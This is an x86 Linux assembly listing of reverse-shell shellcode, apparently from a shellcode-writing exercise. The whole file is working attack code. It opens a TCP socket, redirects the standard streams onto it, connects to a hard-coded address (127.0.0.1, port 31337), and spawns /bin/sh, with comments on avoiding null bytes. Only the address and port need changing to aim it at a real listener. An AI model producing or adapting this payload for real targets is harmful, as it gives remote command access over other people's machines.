global _start
section .text
_start:
;initiate the variables and clear the variables (trick from msfpayload)
xor ebx,ebx
mul ebx
;first create a socket by pushing the variables

;sockfd = socket(AF_INET, SOCK_STREAM, 0);
mov al,102 ;move syscall into al, do not use eax or you will end up with 0x00
push ebx; Build the arguments list, 0 indicates the default protocol
inc ebx ; increase to one
push ebx  ; 1 on the stack, this is to indicate that we will be using SOCK_STREAM
push byte 0x2 ; 2 is AF_INET
mov ecx, esp ; move the stackpointer into ecx
int 0x80 ; syscall to create a socket file descriptor

xchg ebx,eax
push byte 0x2; push it on the stack, then pop it into ecx to avoid 0x00 bytes
pop ecx 

dup_loop:
  mov BYTE al, 0x3F ; dup2  syscall #63
  int 0x80          ; dup2(c, 0)
  dec ecx           ; count down to 0
  jns dup_loop      ; If the sign flag is not set, ecx is not negative.

push 0x0100007f  ;the IP address 127.0.0.1
push word 0x697a;port number 31337
mov cx,2
push word cx
mov ecx,esp      ;move the argument pointer into ecx
push byte 0x10   ;move 16 on top of the stack, this is the length of the struct
push ecx                 ;pointer to the argument
push ebx                 ;pointer to the file descriptor
mov ecx,esp
mov al,102               ;move the syscall into al
int 0x80

;call execve as we have done before
; execve(const char *filename, char *const argv [], char *const envp[])
  mov BYTE al, 11   ; execve  syscall #11
  push edx          ; push some nulls for string termination.
  push 0x68732f2f   ; push "//sh" to the stack.
  push 0x6e69622f   ; push "/bin" to the stack.
  mov ebx, esp      ; Put the address of "/bin//sh" into ebx via esp.
  push edx          ; push 32-bit null terminator to stack.
  mov edx, esp      ; This is an empty array for envp.
  push ebx          ; push string addr to stack above null terminator.
  mov ecx, esp      ; This is the argv array with string ptr
  int 0x80          ; execve("/bin//sh", ["/bin//sh", NULL], [NULL])
